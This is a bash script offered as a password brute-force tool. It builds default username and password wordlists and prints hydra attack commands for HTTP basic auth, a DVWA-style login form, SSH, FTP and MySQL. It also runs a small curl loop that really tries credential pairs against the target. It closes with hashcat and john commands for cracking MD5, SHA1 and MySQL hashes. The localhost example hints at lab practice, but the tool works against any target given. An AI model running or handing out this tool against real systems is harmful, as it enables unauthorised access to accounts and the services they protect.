#!/bin/bash
#
# Password Cracker/Brute Force Script
# Similar to: hydra, john the ripper
# Package equivalent: brew install hydra
#
# Usage: ./password_cracker.sh <target> <service>
# Example: ./password_cracker.sh localhost:8081 http

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <target> <service>"
    echo "Example: $0 localhost:8081 http"
    echo "Services: http, ssh, ftp, mysql"
    exit 1
fi

TARGET="$1"
SERVICE="$2"

# Common default credentials
echo "Creating credential lists..."

cat > /tmp/users.txt << EOF
admin
root
administrator
user
test
guest
demo
oracle
postgres
web
www
ftp
mysql
sa
support
operator
manager
service
system
EOF

cat > /tmp/passwords.txt << EOF
password
admin
root
123456
password123
12345678
qwerty
abc123
111111
1234567890
1234567
password1
123123
1234
12345
iloveyou
admin123
letmein
monkey
dragon
EOF

echo "========================================="
echo "    PASSWORD BRUTE FORCE ATTACK"
echo "    Target: $TARGET"
echo "    Service: $SERVICE"
echo "========================================="
echo ""

case "$SERVICE" in
    http)
        echo "HTTP Basic Auth attack:"
        echo "hydra -L /tmp/users.txt -P /tmp/passwords.txt $TARGET http-get /"
        echo ""
        echo "HTTP Form attack (DVWA example):"
        echo "hydra -L /tmp/users.txt -P /tmp/passwords.txt $TARGET http-get-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\""
        echo ""
        echo "Manual test with curl:"
        for user in admin root test; do
            for pass in password admin 123456; do
                echo -n "Testing $user:$pass ... "
                response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "http://$TARGET/")
                if [ "$response" == "200" ]; then
                    echo -e "\033[32mSUCCESS!\033[0m"
                else
                    echo "Failed ($response)"
                fi
            done
        done
        ;;
        
    ssh)
        echo "SSH brute force:"
        echo "hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://$TARGET"
        echo ""
        echo "With specific user:"
        echo "hydra -l root -P /tmp/passwords.txt ssh://$TARGET"
        ;;
        
    ftp)
        echo "FTP brute force:"
        echo "hydra -L /tmp/users.txt -P /tmp/passwords.txt ftp://$TARGET"
        echo ""
        echo "Test anonymous access:"
        echo "ftp $TARGET"
        echo "Username: anonymous"
        echo "Password: anonymous"
        ;;
        
    mysql)
        echo "MySQL brute force:"
        echo "hydra -L /tmp/users.txt -P /tmp/passwords.txt mysql://$TARGET"
        echo ""
        echo "Manual test:"
        echo "mysql -h ${TARGET%:*} -u root -p"
        ;;
        
    *)
        echo "Unknown service: $SERVICE"
        echo "Supported: http, ssh, ftp, mysql"
        exit 1
        ;;
esac

echo ""
echo "========================================="
echo "HASH CRACKING (if you find hashes):"
echo "========================================="
echo ""
echo "MD5 hash (32 chars):"
echo "hashcat -m 0 hash.txt /tmp/passwords.txt"
echo "john --format=raw-md5 hash.txt"
echo ""
echo "SHA1 hash (40 chars):"
echo "hashcat -m 100 hash.txt /tmp/passwords.txt"
echo ""
echo "MySQL hash:"
echo "hashcat -m 300 hash.txt /tmp/passwords.txt"
echo ""
echo "Online crackers:"
echo "https://crackstation.net/"
echo "https://hashkiller.io/"
echo ""

# Cleanup
rm -f /tmp/users.txt /tmp/passwords.txt 2>/dev/null